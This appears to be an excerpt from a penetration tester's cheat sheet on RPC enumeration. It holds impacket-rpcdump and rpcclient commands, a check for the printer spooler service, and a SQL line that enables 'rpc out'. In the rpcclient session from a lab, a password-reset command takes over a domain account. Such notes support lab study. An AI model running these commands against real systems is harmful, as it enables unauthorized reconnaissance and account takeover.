## impacket-rpcdump

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Impacket > impacket-rpcdump`

```
impacket-rpcdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
```

> Source: `01101100-C0D3X-00110110.md` → `Enumeration > Service Enumeration > RPC`

```bash
rpcinfo -p <target>
nmap --script=rpc-grind -p 111 <target>
```


## impacket Rpcdump check printer service

> Source: `01101100-C0D3X-00110110.md` → `Impacket > impacket Rpcdump check printer service`

```
impacket-rpcdump <domain>/'<user>':'<password>'@<dc-ip> | grep MS-RPRN
```


## RPCOut (ErrorMsg: is not configured for RPC)

> Source: `01101100-C0D3X-00110110.md` → `xfreerdp > RPCOut (ErrorMsg: is not configured for RPC)`

```
EXEC sp_serveroption '<ServerName>', 'rpc out', 'true';
```

---


> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > RPC`

```
rpcclient 192.168.162.122 -N
```
```
rpcclient -W '' -c querydispinfo -U''%'' '192.168.181.175'
```
```
rpcclient -U nagoya-industries/svc_helpdesk 192.168.167.21
# commands from Nagoya
enumdomusers
enumdomgroups
queryusergroups 0x46c
setuserinfo christopher.lewis 23 'Admin!23'
```

